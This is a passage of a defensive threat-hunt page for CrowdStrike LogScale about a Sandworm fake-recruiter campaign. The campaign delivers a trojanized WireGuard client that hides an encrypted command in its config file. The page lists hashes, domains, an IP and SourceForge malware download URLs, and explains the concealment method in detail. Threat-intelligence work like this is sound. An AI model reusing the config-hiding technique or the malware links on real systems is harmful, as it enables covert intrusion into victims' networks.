@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sandworm SopraVPN Fake-Recruiter Campaign — CrowdStrike CQL Threat-Hunt Queries | HuntPack</title>
+<meta name="description" content="Ready-to-run CrowdStrike LogScale (CQL) hunt queries for the Sandworm/UAC-0145 fake-recruiter campaign delivering SopraVPN, a trojanized WireGuard VPN client: MITRE ATT&amp;CK mapping, IOCs, detection and hardening.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://slapopotamus.github.io/HuntPack/hunts/Sandworm-SopraVPN-Hunt.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sandworm SopraVPN Fake-Recruiter Campaign — CrowdStrike CQL Threat-Hunt Queries | HuntPack">
+<meta property="og:description" content="Ready-to-run CrowdStrike LogScale (CQL) hunt queries for the Sandworm/UAC-0145 fake-recruiter campaign delivering SopraVPN, a trojanized WireGuard VPN client.">
+<meta property="og:url" content="https://slapopotamus.github.io/HuntPack/hunts/Sandworm-SopraVPN-Hunt.html">
+<meta name="twitter:card" content="summary">
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --text: #e6edf3;
+  --text-muted: #8b949e;
+  --accent: #02c39a;
+  --accent-dim: rgba(2,195,154,0.13);
+  --red: #f85149; --yellow: #d29922; --green: #7ee787; --purple: #d2a8ff; --blue: #58a6ff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 14px; line-height: 1.6; }
+
+#sidebar { position: fixed; top: 0; left: 0; width: 210px; height: 100vh; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; z-index: 100; transition: transform 0.2s ease; }
+.sidebar-logo { padding: 14px 14px 12px; border-bottom: 1px solid var(--border); }
+.sidebar-logo .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent); font-weight: 700; }
+.sidebar-logo .pack-name { font-size: 12px; color: var(--text); font-weight: 600; margin-top: 3px; line-height: 1.3; }
+.sidebar-logo .version { font-size: 10px; color: var(--text-muted); margin-top: 2px; }
+#sidebar nav { padding: 8px 0; }
+#sidebar nav a { display: block; padding: 4px 14px 4px 16px; color: var(--text-muted); text-decoration: none; font-size: 11.5px; border-left: 2px solid transparent; transition: all 0.12s; }
+#sidebar nav a:hover, #sidebar nav a.active { color: var(--accent); background: var(--accent-dim); border-left-color: var(--accent); }
+#sidebar nav .nav-section { padding: 10px 14px 3px; font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: #444d56; font-weight: 700; }
+
+#toc-toggle { position: fixed; top: 10px; left: 172px; z-index: 200; background: var(--surface2); color: var(--accent); border: 1px solid var(--accent); border-radius: 5px; padding: 4px 9px; font-size: 13px; line-height: 1; cursor: pointer; transition: left 0.2s ease; font-family: inherit; }
+#toc-toggle:hover { background: var(--accent-dim); }
+#main { margin-left: 210px; padding: 24px 28px 80px; max-width: 1060px; transition: margin-left 0.2s ease; }
+body.toc-collapsed #sidebar { transform: translateX(-100%); }
+body.toc-collapsed #main { margin-left: 0; }
+body.toc-collapsed #toc-toggle { left: 10px; }
+@media (max-width: 768px) { #sidebar { transform: translateX(-100%); } #main { margin-left: 0; } #toc-toggle { left: 10px; } body.toc-shown #sidebar { transform: translateX(0); } }
+
+.hp-header { background: linear-gradient(140deg, #06231d 0%, var(--surface) 60%); border: 1px solid var(--accent); border-radius: 8px; padding: 22px 24px; margin-bottom: 24px; }
+.hp-header h1 { font-size: 20px; color: var(--accent); font-weight: 700; letter-spacing: -0.01em; }
+.hp-header .subtitle { font-size: 12px; color: var(--text-muted); margin-top: 3px; margin-bottom: 14px; }
+.meta-grid { display: flex; flex-wrap: wrap; gap: 18px; }
+.meta-item .mk { font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); }
+.meta-item .mv { font-size: 12px; color: var(--text); font-weight: 600; }
+
+.section { margin-bottom: 28px; scroll-margin-top: 16px; }
+.section-hdr { display: flex; align-items: center; gap: 8px; padding: 9px 14px; background: var(--surface); border: 1px solid var(--border); border-radius: 6px 6px 0 0; }
+.section-hdr h2 { font-size: 13px; font-weight: 600; color: var(--text); }
+.snum { font-size: 10px; color: var(--accent); font-weight: 700; background: var(--accent-dim); padding: 1px 6px; border-radius: 3px; }
+.section-body { background: var(--surface); border: 1px solid var(--border); border-top: none; border-radius: 0 0 6px 6px; padding: 16px; }
+
+table { width: 100%; border-collapse: collapse; font-size: 12px; display: block; overflow-x: auto; max-width: 100%; }
+th { background: var(--surface2); color: var(--text-muted); text-transform: uppercase; font-size: 9.5px; letter-spacing: 0.06em; padding: 6px 10px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; }
+td { padding: 6px 10px; border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.5; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--surface2); }
+.badge { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; }
+.b-high { background: rgba(248,81,73,0.18); color: #f85149; }
+.b-med { background: rgba(210,153,34,0.18); color: #d29922; }
+.b-low { background: rgba(126,231,135,0.18); color: #7ee787; }
+.b-crit { background: rgba(248,81,73,0.28); color: #ff7b72; border: 1px solid #f85149; }
+.b-info { background: rgba(88,166,255,0.15); color: #58a6ff; }
+.b-purple { background: rgba(210,168,255,0.15); color: #d2a8ff; }
+
+.cloud-sel { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; padding: 7px 12px; background: var(--surface); border: 1px solid var(--accent); border-radius: 6px; font-size: 11px; margin-bottom: 14px; }
+.cloud-sel label { color: var(--text-muted); }
+.cloud-hint { color: var(--text-muted); flex: 1 1 240px; min-width: 0; }
+.cloud-sel select { background: var(--surface2); color: var(--text); border: 1px solid var(--border); border-radius: 4px; padding: 2px 7px; font-size: 11px; cursor: pointer; font-family: inherit; }
+.query-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 14px; overflow: hidden; }
+.qc-header { display: flex; align-items: center; justify-content: space-between; padding: 9px 12px; background: var(--accent-dim); border-bottom: 1px solid var(--border); flex-wrap: wrap; gap: 8px; }
+.qc-title { font-size: 12.5px; font-weight: 600; color: var(--text); }
+.qc-badges { display: flex; gap: 5px; flex-wrap: wrap; }
+.qc-actions { display: flex; gap: 6px; }
+.qc-actions button { padding: 3px 9px; border-radius: 4px; font-size: 10.5px; font-weight: 600; cursor: pointer; border: 1px solid; transition: all 0.12s; font-family: inherit; }
+.btn-copy { background: var(--accent-dim); color: var(--accent); border-color: var(--accent); }
+.btn-copy.copied { background: rgba(126,231,135,0.18); color: #7ee787; border-color: #7ee787; }
+.btn-falcon { background: rgba(88,166,255,0.1); color: #58a6ff; border-color: rgba(88,166,255,0.5); }
+.btn-falcon:hover { background: rgba(88,166,255,0.22); }
+.qc-body { padding: 12px; }
+pre.cql { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Fira Code','Consolas',monospace; font-size: 11px; line-height: 1.55; overflow-x: auto; color: #e6edf3; }
+.cm { color: #8b949e; font-style: italic; }
+pre.code { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: 10px 12px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; line-height: 1.5; overflow-x: auto; color: #e6edf3; margin: 6px 0; white-space: pre; }
+
+.ioc-grab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(330px, 1fr)); gap: 12px; margin: 10px 0 18px; }
+.ioc-grab { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 10px 12px; }
+.ioc-grab .igh { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+.ioc-grab .igt { font-size: 11.5px; font-weight: 700; color: var(--text); }
+.ioc-grab .igc { font-size: 9.5px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; }
+.tier-blk { border: 1px solid var(--border); border-radius: 6px; padding: 11px 13px; margin-bottom: 10px; background: var(--surface2); }
+.tier-imm { border-left: 3px solid #f85149; } .tier-near { border-left: 3px solid #d29922; } .tier-strat { border-left: 3px solid #58a6ff; }
+.tier-lbl { font-size: 9.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 5px; }
+.tier-imm .tier-lbl { color: #f85149; } .tier-near .tier-lbl { color: #d29922; } .tier-strat .tier-lbl { color: #58a6ff; }
+.callout { display: block; padding: 9px 12px; border-radius: 5px; margin: 8px 0; font-size: 12px; line-height: 1.5; }
+.callout-warn { background: rgba(210,153,34,0.1); border: 1px solid rgba(210,153,34,0.35); color: #d29922; }
+.callout-info { background: rgba(88,166,255,0.09); border: 1px solid rgba(88,166,255,0.3); color: #58a6ff; }
+.callout-danger { background: rgba(248,81,73,0.09); border: 1px solid rgba(248,81,73,0.3); color: #f85149; }
+.chg-entry { display: flex; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+.chg-ver { color: var(--accent); min-width: 40px; font-weight: 700; } .chg-date { color: var(--text-muted); min-width: 88px; }
+.ticket { border-left: 3px solid var(--accent); background: var(--surface2); border-radius: 6px; padding: 12px 14px; }
+p { margin-bottom: 7px; font-size: 13px; } ul, ol { padding-left: 18px; margin: 6px 0; } li { font-size: 12.5px; margin-bottom: 3px; }
+a { color: var(--accent); text-decoration: none; } a:hover { text-decoration: underline; }
+h3 { font-size: 12.5px; font-weight: 700; margin: 13px 0 7px; color: var(--text); } h4 { font-size: 12px; font-weight: 600; margin: 9px 0 5px; color: var(--text-muted); }
+code { background: var(--surface2); border: 1px solid var(--border); border-radius: 3px; padding: 0 4px; font-family: 'Cascadia Code','Consolas',monospace; font-size: 11px; color: var(--accent); }
+footer { margin-top: 30px; padding-top: 14px; border-top: 1px solid var(--border); font-size: 11px; color: var(--text-muted); }
+#sidebar{scrollbar-width:none}#sidebar::-webkit-scrollbar{display:none}
+</style>
+</head>
+<body>
+
+<button id="toc-toggle" onclick="toggleToc()" title="Show / hide table of contents" aria-label="Show or hide table of contents">☰</button>
+
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="brand"><a href="https://slapopotamus.github.io/HuntPack/" style="color:inherit;text-decoration:none" title="HuntPack library — home">HUNTPACK</a></div>
+    <div class="pack-name">Sandworm / UAC-0145 — SopraVPN Fake-Recruiter Campaign</div>
+    <div class="version">v0.1 · 2026-08-23</div>
+  </div>
+  <nav>
+    <div class="nav-section">Overview</div>
+    <a href="#s1">1 · Executive Summary</a>
+    <a href="#s2">2 · Source Review</a>
+    <a href="#s3">3 · Hunt Brief &amp; Chain</a>
+    <a href="#s4">4 · IOC Table</a>
+    <a href="#s5">5 · Affected Surface</a>
+    <a href="#s6">6 · ATT&amp;CK Mapping</a>
+    <div class="nav-section">Detection</div>
+    <a href="#s7">7 · Native Hunts</a>
+    <a href="#s8">8 · CQL Queries</a>
+    <a href="#s9">9 · Custom IOA Recs</a>
+    <a href="#s10">10 · IOC Appendix</a>
+    <a href="#s11">11 · Validation Gates</a>
+    <div class="nav-section">Response</div>
+    <a href="#s12">12 · Hardening</a>
+    <a href="#s13">13 · Playbooks</a>
+    <a href="#s14">14 · Containment</a>
+    <div class="nav-section">Meta</div>
+    <a href="#s15">15 · Coverage Map</a>
+    <a href="#s16">16 · Hunt Ticket</a>
+    <a href="#s17">17 · Changelog</a>
+    <a href="#s18">18 · References</a>
+  </nav>
+</nav>
+
+<div id="main">
+
+<div class="hp-header">
+  <h1>Sandworm / UAC-0145 — SopraVPN Fake-Recruiter Campaign</h1>
+  <div class="subtitle">Fake IT-recruiter hiring processes deliver "SopraVPN," a trojanized WireGuard client that hides an AES-256-GCM-encrypted attacker command inside the VPN config file itself, executed on tunnel-up via WireGuard's own PostUp mechanism</div>
+  <div class="meta-grid">
+    <div class="meta-item"><div class="mk">Threat</div><div class="mv">UAC-0145 (sub-cluster of UAC-0002 / Sandworm / APT44 / Seashell Blizzard)</div></div>
+    <div class="meta-item"><div class="mk">Severity</div><div class="mv"><span class="badge b-crit">NATION-STATE · ACTIVE</span></div></div>
+    <div class="meta-item"><div class="mk">Type</div><div class="mv">Fake-recruiter social engineering → trojanized VPN client → config-hidden backdoor</div></div>
+    <div class="meta-item"><div class="mk">Access</div><div class="mv">Victim-executed install of SopraVPN.exe (user-driven, not exploit-driven)</div></div>
+    <div class="meta-item"><div class="mk">Version</div><div class="mv">v0.1 · 2026-08-23</div></div>
+    <div class="meta-item"><div class="mk">Author</div><div class="mv">HuntPack</div></div>
+    <div class="meta-item"><div class="mk">Confidence</div><div class="mv">High (national CERT primary source + 4 corroborating)</div></div>
+  </div>
+</div>
+
+<!-- 1 -->
+<div class="section" id="s1">
+  <div class="section-hdr"><span class="snum">01</span><h2>Executive Summary</h2></div>
+  <div class="section-body">
+    <p>Sandworm (GRU Unit 74455 / APT44 / Seashell Blizzard), through its sub-cluster <strong>UAC-0145</strong>, is running a patient, human-driven social-engineering campaign against Ukrainian IT and system-administrator professionals, active since at least May 2026 and formally attributed by <strong>CERT-UA on 2026-08-08</strong> (advisory <code>cert.gov.ua/article/6318863</code>), with independent corroboration published 2026-08-10/11 by The Record, BleepingComputer, The Hacker News and TechTimes.</p>
+    <p>Attackers pose as recruiters — impersonating an IT firm called <strong>"ATLAS Business Group"</strong> — after reviewing victim résumés on legitimate job-search platforms. Contact moves from the job site's chat to Telegram, where a fake HR manager claiming to screen for <strong>Sopra Steria Bulgaria</strong> (a real company, not affiliated with the attackers) runs a preliminary chat, followed by a Zoom interview with an English-speaking man reported as 30–35 years old — CERT-UA itself could not rule out that the interviewer was an AI-generated persona. A follow-up email delivers a WireGuard VPN configuration for a bogus "technical assessment," deliberately built to fail to connect.</p>
+    <p>When the connection fails, the fake recruiter directs the victim to a spoofed site styled to resemble Sopra Steria Bulgaria (<code>soprasteria-bg[.]com</code>) to download <strong>"SopraVPN,"</strong> a trojanized WireGuard client hosted on SourceForge. SopraVPN is compiled from genuine WireGuard source code with a backdoored config parser: a non-standard <code>SymmetricKey</code> option in the <code>.conf</code> file carries a BASE64-encoded AES-256-GCM blob (nonce + ciphertext + tag); the AES-256 key is the 32-byte decode of the config's own <code>PrivateKey</code> value; the decrypted PowerShell/command payload is then handed to WireGuard's legitimate <code>runScriptCommand</code> mechanism — the same internal call the standard <code>PostUp</code> option uses — so the attacker's command runs automatically and silently the moment the tunnel comes up. A second layer of obfuscation replaces stock Base64 with a custom alphabet, shuffled via Fisher-Yates and seeded from the CRC32 of the <code>SymmetricKey</code> value, hiding <code>PrivateKey</code>/<code>PublicKey</code> from casual inspection. <strong>The malicious code lives in data the config file carries, not in the binary</strong> — a plain hash/signature check of the SopraVPN executable alone will not reveal the backdoor.</p>
+    <p>On <strong>Windows</strong>, the decrypted command creates a scheduled task and downloads a second-stage payload from the internet. On <strong>Linux</strong>, it uses cURL to retrieve a second-stage executable from attacker infrastructure reached <em>through the newly-established VPN tunnel itself</em> (the malicious config embeds the attacker's own DNS server IP); CERT-UA's captured artifact shows the drop staged at <code>/usr/libexec/timesyncd-check</code>, masquerading as a systemd time-sync helper.</p>
+    <p>This is a <strong>different initial-access chain</strong> than the previously published UAC-0145 ClickFix/EtherHiding HuntPack (CAPTCHA lures, a distinct typosquat C2 domain, GHETTOVIBE/FLUIDLEECH/FREAKYPOLL). No CAPTCHA, no browser paste — the lure here is a fabricated hiring process and the payload is a config file, not a script. Detection priorities are (1) exact hash/filename matching on the SopraVPN binary and malicious <code>.conf</code> artifacts, (2) the anomalous-child-process fingerprint of a WireGuard-family parent spawning PowerShell (Windows) or an unexpected shell/cURL chain (Linux) — a legitimate WireGuard tunnel service never does this, (3) network/DNS activity to the campaign's confirmed lure and C2 infrastructure, and (4) the exact Linux host artifact path <code>/usr/libexec/timesyncd-check</code>.</p>
+    <p class="callout callout-danger"><strong>Defender priority:</strong> the victims of this chain are, by design, system administrators and IT staff with privileged network access. A single successful SopraVPN install can hand the attacker a persistent scheduled-task foothold and a live route into the corporate perimeter riding on top of what the victim believes is a "corporate VPN." CERT-UA's own top recommendation — restrict corporate resource access to managed, EDR-enrolled devices, including personally-owned equipment used for "hiring assessments" — closes the single biggest gap this campaign is built to exploit.</p>
+  </div>
+</div>
+
+<!-- 2 -->
+<div class="section" id="s2">
+  <div class="section-hdr"><span class="snum">02</span><h2>Source Review &amp; Web Hunter Notes</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Tier</th><th>Source</th><th>Key finding</th><th>Carry forward</th></tr>
+      <tr><td><span class="badge b-crit">T1</span></td><td><a href="https://cert.gov.ua/article/6318863">CERT-UA — "Соціальна інженерія у виконанні UAC-0145: компрометація у процесі працевлаштування," published 2026-08-08 (article 6318863)</a></td><td>Primary, government-issued advisory. Full TTP write-up plus every atomic indicator in this pack: 5 file hashes (MD5+SHA256), 4 domains, 1 IP, 2 host artifacts, 2 email addresses, 1 Telegram handle.</td><td>Yes — sole IOC source; all hash/IP/domain values transcribed verbatim from this snapshot</td></tr>
+      <tr><td><span class="badge b-high">T2</span></td><td><a href="https://thehackernews.com/2026/08/sandworm-linked-uac-0145-uses-fake-job.html">The Hacker News — "Sandworm-Linked UAC-0145 Uses Fake Job Interviews to Push VPN That Can Run Commands," Ravie Lakshmanan, 2026-08-11</a></td><td>Corroborates the full technical chain; independently identifies a third SourceForge project (<code>soprasteriavpn</code>) not named in the CERT-UA advisory text (cached-search find, project itself unavailable for download).</td><td>Yes — narrative corroboration + one additional SourceForge project name (used as a hunt lead, not an atomic IOC since it was never confirmed downloadable)</td></tr>
+      <tr><td><span class="badge b-high">T2</span></td><td><a href="https://www.bleepingcomputer.com/news/security/sandworm-hackers-target-it-pros-with-trojanized-wireguard-vpn-client/">BleepingComputer — "Sandworm hackers target IT pros with trojanized WireGuard VPN client," Bill Toulas, 2026-08-11</a></td><td>Corroborates the chain with concise phrasing; confirms attacker impersonation used addresses "similar to the company's office in Bulgaria."</td><td>Yes — corroboration and alert-copy phrasing</td></tr>
+      <tr><td><span class="badge b-med">T2/3</span></td><td><a href="https://therecord.media/russian-military-hackers-pose-as-recruiters-ukraine-it-workers">The Record / Recorded Future News — "Russian military hackers pose as recruiters to target Ukrainian IT workers," Daryna Antoniuk, 2026-08-10</a></td><td>Independent corroboration; notes the Telegram account <code>@Sales_ManagerABG</code>-style handle was still reachable at publish time although the job ad had been removed, and situates the campaign in Sandworm's broader history (2015/2016 grid attacks, NotPetya).</td><td>Partial — narrative/attribution context only, no new atomic IOCs</td></tr>
+      <tr><td><span class="badge b-med">T2/3</span></td><td><a href="https://www.techtimes.com/articles/323950/20260811/sandworm-recruiter-scam-targets-ukrainian-sysadmins-deploys-hidden-wireguard-trojan.htm">TechTimes — "Sandworm Recruiter Scam Targets Ukrainian Sysadmins, Deploys Hidden WireGuard Trojan," Kyle Belmonte, 2026-08-11</a></td><td>Deep secondary analysis: frames this as Sandworm's first confirmed adoption of the DPRK-style "Contagious Interview" technique; cross-references UAC-0145's other 2026 tracks (ClickFix/EtherHiding, fake Notepad++/UAC-0099); provides concrete defender guidance (verify recruiters through official channels, inspect configs for unfamiliar keys).</td><td>Yes — context and defender guidance folded into §1 and §12; no new atomic IOCs</td></tr>
+    </table>
+    <p class="callout callout-info"><strong>Security note (pipeline integrity):</strong> all five fetched sources were reviewed for embedded instructions directed at an AI analysis pipeline (prompt-injection). None was found — every source is ordinary news/advisory prose, treated throughout as data to analyze, never as instructions to execute. The one literal attacker-authored shell command quoted in the CERT-UA advisory (the Linux <code>timesyncd-check</code> downloader one-liner) is reproduced in this pack strictly as a host indicator/behavioral signature for detection engineering — it was never executed or treated as a directive.</p>
+    <p><strong>Web-hunter decision:</strong> CERT-UA is treated as the sole authoritative source for atomic indicators; the four secondary sources are used only for narrative corroboration, dating, and defender framing. Every hash, domain, IP, filename and host-path value in §4 and §10 is copied character-for-character from the saved CERT-UA snapshot (<code>Sandworm-SopraVPN-Hunt-sources/01-certua-advisory-6318863.txt</code>) rather than from secondary paraphrase, to eliminate transcription drift between sources.</p>
+  </div>
+</div>
+
+<!-- 3 -->
+<div class="section" id="s3">
+  <div class="section-hdr"><span class="snum">03</span><h2>Hunt Brief &amp; Attack Chain</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>#</th><th>Step</th><th>Telemetry</th><th>Hunt angle</th></tr>
+      <tr><td>1</td><td>Recon — attacker reviews victim résumés on legitimate job-search platforms.</td><td>None (human-layer, off-platform)</td><td>Not observable in Falcon</td></tr>
+      <tr><td>2</td><td>Rapport — contact via job-site chat, moved to Telegram (<code>@Sales_ManagerABG</code>-style handle) posing as "ATLAS Business Group," then a Zoom interview with a possibly AI-generated interviewer.</td><td>None (human-layer)</td><td>Not observable in Falcon — user-awareness control only (§12)</td></tr>
+      <tr><td>3</td><td>Delivery — email with a WireGuard <code>.conf</code> for a bogus "corporate VPN" technical assessment, deliberately built to fail, sent from an address mimicking Sopra Steria.</td><td>Email gateway; file-write if the attachment is saved to disk</td><td>Native mail-gateway hunt (§7)</td></tr>
+      <tr><td>4</td><td>Lure pivot — fake recruiter points the victim to <code>soprasteria-bg[.]com</code>, which links to a "SopraVPN" download hosted on SourceForge.</td><td><code>DnsRequest</code> / <code>NetworkConnectIP4</code> to the lure domains + SourceForge; file write of <code>sopravpn*.exe</code></td><td><strong>Q4, Q7</strong></td></tr>
+      <tr><td>5</td><td>Install &amp; connect — victim runs <code>SopraVPN.exe</code> / <code>sopravpn_v*.exe</code> and imports the malicious <code>.conf</code> carrying the <code>SymmetricKey</code> value.</td><td><code>ProcessRollup2</code> (filename/hash match)</td><td><strong>Q1</strong></td></tr>
+      <tr><td>6</td><td>Backdoor trigger — WireGuard's <code>PostUp</code>/<code>runScriptCommand</code> mechanism decrypts the AES-256-GCM payload (keyed by <code>SymmetricKey</code> + <code>PrivateKey</code>) and executes it the instant the tunnel comes up.</td><td><code>ProcessRollup2</code> parent-child anomaly</td><td><strong>Q2</strong></td></tr>
+      <tr><td>7</td><td>Windows persistence + 2nd stage — decrypted PowerShell registers a scheduled task and downloads a payload from the internet.</td><td><code>ProcessRollup2</code> (<code>schtasks.exe /create</code>), <code>NetworkConnectIP4</code>/<code>DnsRequest</code> for the download</td><td><strong>Q3</strong></td></tr>
+      <tr><td>8</td><td>Linux 2nd stage — cURL retrieves an executable from attacker infrastructure reached <em>through</em> the tunnel; drop staged at <code>/usr/libexec/timesyncd-check</code>.</td><td><code>ProcessRollup2</code> (curl), file-write telemetry if available</td><td><strong>Q6</strong></td></tr>
+      <tr><td>9</td><td>C2 check-in — HTTPS call to <code>douncloud[.]site</code> carrying a <code>%UUID%---%MACHINEGUID%</code>-shaped beacon value; rogue WireGuard endpoint at <code>139.28.36[.]23</code> udp/51820.</td><td><code>DnsRequest</code>/<code>NetworkConnectIP4</code></td><td><strong>Q4, Q5, Q8</strong></td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- 4 -->
+<div class="section" id="s4">
+  <div class="section-hdr"><span class="snum">04</span><h2>Consolidated IOC Table</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Type</th><th>Value</th><th>Confidence</th><th>Action</th><th>Context</th><th>Expiry</th></tr>
+      <tr><td>sha256</td><td><code>4646ea832a61c9f7bdb11fee64ad82ae6d9856d2f3a4b36a8a4a571145be1260</code></td><td>High</td><td>detect</td><td>sopravpn_v7__1_.exe</td><td>2027-02-23</td></tr>
+      <tr><td>sha256</td><td><code>aeb702f65445d12605a84be6fa31545c71be0bf619b1cbedbee5800a43fc6793</code></td><td>High</td><td>detect</td><td>SopraVPN.exe (variant 1)</td><td>2027-02-23</td></tr>
+      <tr><td>sha256</td><td><code>6a60152f7c83d3416925316b75eb7720953cdd69aae9f0e088c789c25f51437f</code></td><td>High</td><td>detect</td><td>SopraVPN.exe (variant 2)</td><td>2027-02-23</td></tr>
+      <tr><td>sha256</td><td><code>480ab92995295378c9b30b8b6fb61516313ed7482eb893967841b05e233fe341</code></td><td>High</td><td>hunt</td><td>sopraconf.conf — malicious Windows VPN config</td><td>2026-11-23</td></tr>
+      <tr><td>sha256</td><td><code>22a21958a2c4752214192175793c13acae2f6d766007d55d2140f1570ae1df67</code></td><td>High</td><td>hunt</td><td>sopraconfLinux.conf — malicious Linux VPN config</td><td>2026-11-23</td></tr>
+      <tr><td>md5</td><td><code>bf6670760305228fd83a5e1467a99d91</code></td><td>High</td><td>enrich</td><td>sopravpn_v7__1_.exe (MD5)</td><td>2026-11-23</td></tr>
+      <tr><td>md5</td><td><code>be11cc798c239b9d4eaa76ab03d07168</code></td><td>High</td><td>enrich</td><td>SopraVPN.exe variant 1 (MD5)</td><td>2026-11-23</td></tr>
+      <tr><td>md5</td><td><code>676f44c7fa03693247d0dd5c3a0e13f7</code></td><td>High</td><td>enrich</td><td>SopraVPN.exe variant 2 (MD5)</td><td>2026-11-23</td></tr>
+      <tr><td>md5</td><td><code>d478e96bfb0f3a586c6d17d8bfc874ea</code></td><td>High</td><td>enrich</td><td>sopraconf.conf (MD5)</td><td>2026-11-23</td></tr>
+      <tr><td>md5</td><td><code>088acb50f7a7e54f887da7b561e18613</code></td><td>High</td><td>enrich</td><td>sopraconfLinux.conf (MD5)</td><td>2026-11-23</td></tr>
+      <tr><td>domain</td><td><code>soprasteria-bg.com</code></td><td>High</td><td>detect</td><td>Spoofed Sopra Steria Bulgaria lure site; registered 2026-07-16</td><td>2027-02-23</td></tr>
+      <tr><td>domain</td><td><code>soprasteriabg.com</code></td><td>High</td><td>detect</td><td>Related spoof domain (no hyphen); registered 2026-05-14</td><td>2027-02-23</td></tr>
+      <tr><td>domain</td><td><code>atlasgroup-ua.com</code></td><td>High</td><td>detect</td><td>Fake "ATLAS Business Group" recruiter site; registered 2026-02-10</td><td>2027-02-23</td></tr>
+      <tr><td>domain</td><td><code>douncloud.site</code></td><td>High</td><td>detect</td><td>C2 check-in domain (<code>subid=%UUID%---%MACHINEGUID%</code>)</td><td>2027-02-23</td></tr>
+      <tr><td>ipv4</td><td><code>139.28.36.23</code></td><td>High</td><td>detect</td><td>Rogue WireGuard endpoint, udp/51820</td><td>2027-02-23</td></tr>
+      <tr><td>url</td><td><code>hxxps://sourceforge[.]net/projects/soprabulgariavpn/files/sopravpn_v10.exe/download</code></td><td>Medium</td><td>hunt</td><td>Trojanized installer on SourceForge (legitimate platform abused)</td><td>2026-11-23</td></tr>
+      <tr><td>url</td><td><code>hxxps://sourceforge[.]net/projects/sopravpn/files/sopravpn_v5.exe/download</code></td><td>Medium</td><td>hunt</td><td>Trojanized installer, alternate version</td><td>2026-11-23</td></tr>
+      <tr><td>url</td><td><code>https://sourceforge[.]net/projects/sopravpn/files/sopravpn.exe/download</code></td><td>Medium</td><td>hunt</td><td>Trojanized installer, alternate version</td><td>2026-11-23</td></tr>
+      <tr><td>email</td><td><code>mike.weitzman@soprasteria-bg[.]com</code></td><td>Medium</td><td>pivot</td><td>Fake HR/recruiter sender address</td><td>2026-09-23</td></tr>
+      <tr><td>email</td><td><code>alex.boichenkoit@ukr[.]net</code></td><td>Medium</td><td>pivot</td><td>Secondary contact address named in the advisory</td><td>2026-09-23</td></tr>
+      <tr><td>other</td><td><code>@Sales_ManagerABG</code> (Telegram)</td><td>Medium</td><td>pivot</td><td>Fake "ATLAS Business Group" recruiter Telegram handle</td><td>2026-09-23</td></tr>
+      <tr><td>filepath</td><td><code>/usr/libexec/timesyncd-check</code></td><td>High</td><td>hunt</td><td>Linux 2nd-stage drop path; masquerades as a systemd-timesyncd helper</td><td>2026-11-23</td></tr>
+      <tr><td>filepath</td><td><code>\Microsoft\Windows\ApplicationData\Microsoft</code> (Scheduled Task)</td><td>Medium</td><td>hunt</td><td>Windows scheduled-task path used for persistence / 2nd stage</td><td>2026-11-23</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- 5 -->
+<div class="section" id="s5">
+  <div class="section-hdr"><span class="snum">05</span><h2>Affected Surface &amp; Telemetry Matrix</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Surface</th><th>Required telemetry</th><th>Priority</th><th>Gap risk</th></tr>
+      <tr><td>Windows endpoints (IT/sysadmin workstations)</td><td><code>ProcessRollup2</code>, <code>SyntheticProcessRollup2</code>, <code>NetworkConnectIP4</code>, <code>DnsRequest</code>, scheduled-task creation telemetry</td><td>Critical</td><td>Low — native Falcon sensor coverage</td></tr>
+      <tr><td>Linux endpoints/servers (sysadmin jump boxes)</td><td><code>ProcessRollup2</code>, <code>NetworkConnectIP4</code>, <code>DnsRequest</code></td><td>Critical</td><td>Medium — cURL traffic issued through an already-established WireGuard interface may not always attribute cleanly to the initiating process on every sensor version; validate in tenant</td></tr>
+      <tr><td>Email gateway</td><td>Attachment/link inspection for <code>.conf</code> files and links to the lure domains</td><td>High</td><td>Medium — native mail-gateway hunt, not Falcon CQL (§7)</td></tr>
+      <tr><td>DNS / network egress</td><td><code>DnsRequest</code>, <code>NetworkConnectIP4</code> for campaign domains/IP</td><td>High</td><td>Low</td></tr>
+      <tr><td>Personal/BYOD devices used for "technical assessments"</td><td>None if unmanaged — CERT-UA explicitly flags this as the core exposure</td><td>Critical</td><td>High — closed only by policy (§12 Near-term #4), not by telemetry</td></tr>
+      <tr><td>Identity / SSO</td><td>Not directly targeted by this chain; monitor for anomalous logons originating from a newly-SopraVPN-infected host</td><td>Medium</td><td>N/A to this specific hunt — downstream pivot risk only</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- 6 -->
